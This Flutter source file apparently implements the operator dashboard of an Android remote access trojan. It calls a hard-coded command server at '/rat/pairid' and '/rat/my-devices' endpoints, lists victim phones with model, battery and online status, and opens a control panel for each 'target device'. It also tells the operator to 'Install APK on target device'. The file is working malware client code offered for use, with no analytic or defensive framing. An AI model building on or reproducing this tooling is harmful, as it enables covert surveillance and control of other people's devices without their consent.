// device_dashboard.dart - FIXED VERSION
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';
import 'device_permission.dart';
import 'control_panel.dart';

const _kBase = 'http://senzlinodepriv.senzhosting.my.id:10791';

class DeviceDashboardPage extends StatefulWidget {
  final String username;
  final String role;
  final String sessionKey;
  const DeviceDashboardPage({
      super.key, this.username = '', this.role ='', this.sessionKey = ''});
  @override State<DeviceDashboardPage> createState() => _DDState();
}

class _DDState extends State<DeviceDashboardPage> {
  // Red theme color palette - blood & neon red
  static const _bgDeep     = Color(0xFF050505);
  static const _bgCard     = Color(0xFF12121A);
  static const _borderGlow = Color(0xFFFF0040);
  static const _neonRed    = Color(0xFFFF0040);
  static const _neonCrimson = Color(0xFFDC143C);
  static const _neonDarkRed = Color(0xFF8B0000);
  static const _textPrimary = Color(0xFFEDEDF2);
  static const _textSecondary = Color(0xFF8A8AA3);
  static const _glowGreen  = Color(0xFF00FF88);
  static const _glowRed    = Color(0xFFFF0040);
  static const _darkOverlay = Color(0xFF050508);

  List<dynamic> _visible = [];
  bool   _loading  = true;
  String? _errorMsg;
  String  _pairId  = '';
  bool get _isOwner => widget.role.toLowerCase() == 'owner';
  PermissionResult? _perm;
  Timer? _timer;

  @override
  void initState() {
    super.initState();
    _loadAll();
    _timer = Timer.periodic(const Duration(seconds: 20), (_) => _loadAll());
  }

  @override void dispose() { _timer?.cancel(); super.dispose(); }

  Future<void> _loadAll() async {
    if (!mounted) return;
    try {
      // GET PAIR ID - FIXED: Gunakan endpoint yang benar /rat/pairid
      final pRes = await http
          .get(Uri.parse('$_kBase/rat/pairid?key=${widget.sessionKey}'))
          .timeout(const Duration(seconds: 8));
      if (pRes.statusCode == 200) {
        final pd = jsonDecode(pRes.body);
        // Cek valid response
        if (pd['valid'] == true && pd['pairId'] != null) {
          final newPairId = pd['pairId'].toString();
          if (mounted && newPairId.isNotEmpty) {
            setState(() => _pairId = newPairId);
          }
        } else {
          // Jika pairId null, coba generate ulang dengan meminta ke server
          if (mounted) {
            // PairId belum ada, tapi tetap lanjutkan
            print('[PAIRID] PairId belum tersedia untuk user ini');
          }
        }
      }

      // GET DEVICES
      final dRes = await http
          .get(Uri.parse('$_kBase/rat/my-devices?key=${widget.sessionKey}'))
          .timeout(const Duration(seconds: 10));

      if (!mounted) return;
      if (dRes.statusCode != 200) {
        setState(() { _loading = false; _errorMsg = 'Server error ${dRes.statusCode}'; });
        return;
      }

      final body = jsonDecode(dRes.body);
      if (body['valid'] != true) {
        setState(() { _loading = false; _errorMsg = body['message'] ?? 'Error'; });
        return;
      }

      List<dynamic> devices = List<dynamic>.from(body['devices'] ?? []);

      final now = DateTime.now();
      for (var d in devices) {
        try {
          final seen = DateTime.parse(d['lastSeen']?.toString() ?? '');
          d['online'] = now.difference(seen).inSeconds < 30;
        } catch (_) { d['online'] = false; }
      }

      PermissionResult perm;
      if (_isOwner) {
        perm = PermissionResult(approved: true, allDevices: true, devices: []);
      } else {
        perm = await DevicePermissionStore.getFor(widget.username, widget.sessionKey);
      }

      if (mounted) setState(() {
        _visible = devices; _perm = perm; _loading = false; _errorMsg = null;
      });
    } catch (e) {
      if (mounted) setState(() { _loading = false; _errorMsg = e.toString(); });
    }
  }

  int get _active => _visible.where((d) => d['online'] == true).length;

  void _copyPairId() {
    if (_pairId.isEmpty) {
      ScaffoldMessenger.of(context).showSnackBar(SnackBar(
          backgroundColor: _darkOverlay,
          behavior: SnackBarBehavior.floating,
          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8), side: BorderSide(color: _neonRed.withOpacity(0.5))),
          content: Row(children: [
            Icon(Icons.error, color: _neonRed, size: 18),
            const SizedBox(width: 10),
            Text('Pairing ID not available yet', style: TextStyle(color: _textPrimary)),
          ]),
          duration: const Duration(seconds: 2)));
      return;
    }
    Clipboard.setData(ClipboardData(text: _pairId));
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
        backgroundColor: _darkOverlay,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8), side: BorderSide(color: _neonRed.withOpacity(0.5))),
        content: Row(children: [
          Icon(Icons.check_circle, color: _neonRed, size: 18),
          const SizedBox(width: 10),
          Text('ID copied to clipboard', style: TextStyle(color: _textPrimary)),
        ]),
        duration: const Duration(seconds: 2)));
  }

  @override
  Widget build(BuildContext context) {
    final denied = _perm != null && !_perm!.approved && !_isOwner;

    return Scaffold(
      backgroundColor: _bgDeep,
      body: Stack(children: [
        _buildGridBackground(),
        SafeArea(child: Column(children: [
          Container(
            padding: const EdgeInsets.fromLTRB(18, 14, 18, 10),
            decoration: BoxDecoration(
              color: _bgCard.withOpacity(0.95),
              border: Border(bottom: BorderSide(color: _neonRed.withOpacity(0.2), width: 1)),
              boxShadow: [BoxShadow(color: _neonRed.withOpacity(0.05), blurRadius: 10)],
            ),
            child: Column(children: [
              Row(children: [
                _statBox('Active', '$_active', _glowGreen),
                const Spacer(),
                Column(children: [
                  Text('DEVICE DASHBOARD', 
                      style: TextStyle(color: _neonRed, fontSize: 11, letterSpacing: 2, fontWeight: FontWeight.bold)),
                  Text('@${widget.username}', 
                      style: const TextStyle(color: _textSecondary, fontSize: 9)),
                ]),
                const Spacer(),
                _statBox('Total', '${_visible.length}', _neonCrimson),
              ]),

              // PAIR ID SECTION - FIXED: tampilkan selalu dengan label yang jelas
              const SizedBox(height: 12),
              GestureDetector(
                onTap: _copyPairId,
                child: Container(
                  width: double.infinity,
                  padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      begin: Alignment.topLeft,
                      end: Alignment.bottomRight,
                      colors: [_neonCrimson.withOpacity(0.1), _neonDarkRed.withOpacity(0.1)],
                    ),
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: _neonCrimson.withOpacity(0.3), width: 1),
                    boxShadow: [BoxShadow(color: _neonCrimson.withOpacity(0.1), blurRadius: 8)],
                  ),
                  child: Row(children: [
                    Container(
                      padding: const EdgeInsets.all(6),
                      decoration: BoxDecoration(
                        color: _neonCrimson.withOpacity(0.15),
                        borderRadius: BorderRadius.circular(8),
                      ),
                      child: Icon(Icons.vpn_key, color: _neonCrimson, size: 18),
                    ),
                    const SizedBox(width: 12),
                    Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                      Text('PAIRING ID',
                          style: TextStyle(color: _neonRed.withOpacity(0.7), fontSize: 9, letterSpacing: 1)),
                      const SizedBox(height: 4),
                      Text(_pairId.isEmpty ? 'Not available yet' : _pairId,
                          style: TextStyle(
                              color: _pairId.isEmpty ? _textSecondary.withOpacity(0.5) : _neonCrimson, 
                              fontSize: _pairId.isEmpty ? 12 : 15,
                              fontWeight: FontWeight.bold, 
                              letterSpacing: _pairId.isEmpty ? 0 : 2, 
                              fontFamily: 'monospace')),
                    ])),
                    Column(children: [
                      Icon(Icons.copy, color: _pairId.isEmpty ? _textSecondary.withOpacity(0.3) : _neonRed, size: 18),
                      const SizedBox(height: 2),
                      Text('Copy', style: TextStyle(color: _pairId.isEmpty ? _textSecondary.withOpacity(0.3) : _neonRed.withOpacity(0.7), fontSize: 8)),
                    ]),
                  ]),
                ),
              ),
              const SizedBox(height: 6),
              Text(_isOwner 
                  ? 'Tap to copy ID • Share this ID to connect devices' 
                  : 'Only owner can see Pairing ID',
                  style: TextStyle(color: _textSecondary.withOpacity(0.6), fontSize: 9), textAlign: TextAlign.center),
            ]),
          ),

          if (_errorMsg != null) _banner(Icons.error, _errorMsg!, _glowRed),
          if (denied && _errorMsg == null) _banner(Icons.lock, 'Access not approved yet. Contact owner to get access.', _glowRed),
          if (!_isOwner && !denied && _errorMsg == null && _perm != null && _perm!.approved)
            _banner(Icons.check_circle, 'Access granted. You can see shared devices.', _glowGreen),

          Padding(padding: const EdgeInsets.fromLTRB(16, 12, 16, 10), child: Row(children: [
            Text('CONNECTED DEVICES',
                style: TextStyle(color: _textSecondary, fontSize: 10, fontWeight: FontWeight.bold, letterSpacing: 1.5)),
            const Spacer(),
            _buildNeonButton(
              icon: Icons.refresh,
              onTap: () { setState(() { _loading = true; _errorMsg = null; }); _loadAll(); },
            ),
            const SizedBox(width: 10),
            if (_isOwner)
              _buildNeonButton(
                icon: Icons.manage_accounts,
                label: 'Manage Access',
                onTap: () async {
                  await Navigator.push(context, MaterialPageRoute(
                    builder: (_) => DevicePermissionManagerPage(
                      sessionKey: widget.sessionKey, allDevices: _visible)));
                  _loadAll();
                },
              ),
            const SizedBox(width: 10),
            _buildNeonButton(
              icon: Icons.close,
              onTap: () => Navigator.pop(context),
              danger: true,
            ),
          ])),

          Expanded(
            child: _loading
                ? Center(child: _buildNeonLoader())
                : _visible.isEmpty
                    ? _buildEmptyState(denied)
                    : GridView.builder(
                        padding: const EdgeInsets.fromLTRB(14, 4, 14, 100),
                        gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                            crossAxisCount: 3, crossAxisSpacing: 10, mainAxisSpacing: 10, childAspectRatio: 0.7),
                        itemCount: _visible.length,
                        itemBuilder: (ctx, i) {
                          final d = _visible[i];
                          final on = d['online'] == true;
                          return _buildDeviceCard(d, on);
                        }),
          ),
        ])),
      ]),
    );
  }

  Widget _buildGridBackground() {
    return CustomPaint(
      painter: RedCyberpunkGridPainter(),
      size: Size.infinite,
    );
  }

  Widget _buildNeonButton({required IconData icon, String? label, required VoidCallback onTap, bool danger = false}) {
    final color = danger ? _glowRed : _neonRed;
    return GestureDetector(
      onTap: onTap,
      child: Container(
        padding: label != null 
            ? const EdgeInsets.symmetric(horizontal: 12, vertical: 6)
            : const EdgeInsets.all(6),
        decoration: BoxDecoration(
          color: _darkOverlay.withOpacity(0.8),
          borderRadius: BorderRadius.circular(8),
          border: Border.all(color: color.withOpacity(0.4), width: 1),
        ),
        child: Row(children: [
          Icon(icon, color: color, size: 16),
          if (label != null) ...[
            const SizedBox(width: 6),
            Text(label, style: TextStyle(color: color, fontSize: 11)),
          ],
        ]),
      ),
    );
  }

  Widget _buildNeonLoader() {
    return Column(mainAxisSize: MainAxisSize.min, children: [
      SizedBox(
        width: 40, height: 40,
        child: CircularProgressIndicator(
          valueColor: AlwaysStoppedAnimation(_neonRed),
          strokeWidth: 2,
        ),
      ),
      const SizedBox(height: 12),
      Text('Loading...', style: TextStyle(color: _neonRed.withOpacity(0.7), fontSize: 10)),
    ]);
  }

  Widget _buildEmptyState(bool denied) {
    return Center(child: Column(mainAxisSize: MainAxisSize.min, children: [
      Container(
        padding: const EdgeInsets.all(20),
        decoration: BoxDecoration(
          color: _darkOverlay,
          shape: BoxShape.circle,
          border: Border.all(color: _neonDarkRed.withOpacity(0.2), width: 1),
        ),
        child: Icon(Icons.devices, color: _neonDarkRed.withOpacity(0.4), size: 48),
      ),
      const SizedBox(height: 20),
      Text(denied ? 'Access Denied' : 'No Devices',
          style: TextStyle(color: _neonRed, fontWeight: FontWeight.bold, letterSpacing: 2, fontSize: 13)),
      const SizedBox(height: 8),
      Text(denied ? 'Contact owner for access' : 'No device connected yet',
          style: TextStyle(color: _textSecondary, fontSize: 11)),
      if (!denied) ...[
        const SizedBox(height: 24),
        Container(
          margin: const EdgeInsets.symmetric(horizontal: 30),
          padding: const EdgeInsets.all(16),
          decoration: BoxDecoration(
            color: _bgCard,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: _neonRed.withOpacity(0.15)),
          ),
          child: Column(children: [
            Icon(Icons.info_outline, color: _neonRed, size: 22),
            const SizedBox(height: 12),
            Text('How to connect device', style: TextStyle(color: _neonRed, fontSize: 11, fontWeight: FontWeight.bold)),
            const SizedBox(height: 12),
            Text('1. Install APK on target device\n2. Open APK → enter Pairing ID above\n3. Device will appear here automatically',
                style: TextStyle(color: _textSecondary, fontSize: 10, height: 1.5), textAlign: TextAlign.center),
          ]),
        ),
      ],
    ]));
  }

  Widget _buildDeviceCard(Map<String, dynamic> d, bool on) {
    final glowColor = on ? _glowGreen : _glowRed;
    return GestureDetector(
      onTap: () => Navigator.push(context, MaterialPageRoute(
          builder: (_) => ControlCenterPage(targetDevice: d, role: widget.role))),
      child: Container(
        padding: const EdgeInsets.all(10),
        decoration: BoxDecoration(
          color: _bgCard,
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: glowColor.withOpacity(on ? 0.3 : 0.15), width: 1),
          boxShadow: on ? [BoxShadow(color: glowColor.withOpacity(0.1), blurRadius: 8)] : null,
        ),
        child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
            Icon(Icons.phone_android, color: _textSecondary, size: 14),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 3),
              decoration: BoxDecoration(
                color: glowColor.withOpacity(0.1),
                borderRadius: BorderRadius.circular(6),
                border: Border.all(color: glowColor.withOpacity(0.2)),
              ),
              child: Row(children: [
                Container(width: 4, height: 4, decoration: BoxDecoration(shape: BoxShape.circle, color: glowColor)),
                const SizedBox(width: 4),
                Text(on ? 'Online' : 'Offline',
                    style: TextStyle(color: glowColor, fontSize: 8, fontWeight: FontWeight.bold)),
              ])),
          ]),
          const Spacer(),
          Text(d['model'] ?? 'Unknown',
              style: const TextStyle(color: _textPrimary, fontSize: 11, fontWeight: FontWeight.bold),
              maxLines: 1, overflow: TextOverflow.ellipsis),
          const SizedBox(height: 4),
          Text(d['id']?.substring(0, d['id'].length > 8 ? 8 : d['id'].length) ?? '-',
              style: TextStyle(color: _textSecondary, fontSize: 8),
              maxLines: 1, overflow: TextOverflow.ellipsis),
          const Spacer(),
          Divider(color: _textSecondary.withOpacity(0.15), height: 8),
          Row(children: [
            Icon(Icons.battery_charging_full, color: _textSecondary, size: 10),
            const SizedBox(width: 4),
            Text('${d['battery'] ?? '?'}%',
                style: TextStyle(color: _textPrimary, fontSize: 8)),
            const Spacer(),
            Icon(Icons.chevron_right, color: _neonRed.withOpacity(0.4), size: 14),
          ]),
        ]),
      ),
    );
  }

  Widget _banner(IconData icon, String msg, Color c) => Container(
    margin: const EdgeInsets.fromLTRB(14, 10, 14, 0),
    padding: const EdgeInsets.all(12),
    decoration: BoxDecoration(
      color: c.withOpacity(0.08),
      borderRadius: BorderRadius.circular(10),
      border: Border.all(color: c.withOpacity(0.2)),
    ),
    child: Row(children: [
      Icon(icon, color: c, size: 14),
      const SizedBox(width: 10),
      Expanded(child: Text(msg, style: TextStyle(color: c, fontSize: 11))),
    ]));

  Widget _statBox(String l, String v, Color c) => Column(children: [
    Text(l, style: TextStyle(color: _neonRed.withOpacity(0.6), fontSize: 8, letterSpacing: 1)),
    const SizedBox(height: 4),
    Container(
      padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
      decoration: BoxDecoration(
        color: c.withOpacity(0.08),
        borderRadius: BorderRadius.circular(8),
        border: Border.all(color: c.withOpacity(0.2)),
      ),
      child: Text(v, style: TextStyle(color: c, fontSize: 20, fontWeight: FontWeight.bold)),
    ),
  ]);
}

class RedCyberpunkGridPainter extends CustomPainter {
  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()
      ..color = const Color(0xFFFF0040).withOpacity(0.02)
      ..strokeWidth = 0.5;
    
    for (double x = 0; x < size.width; x += 30) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), paint);
    }
    
    for (double y = 0; y < size.height; y += 30) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), paint);
    }
  }
  
  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => false;
}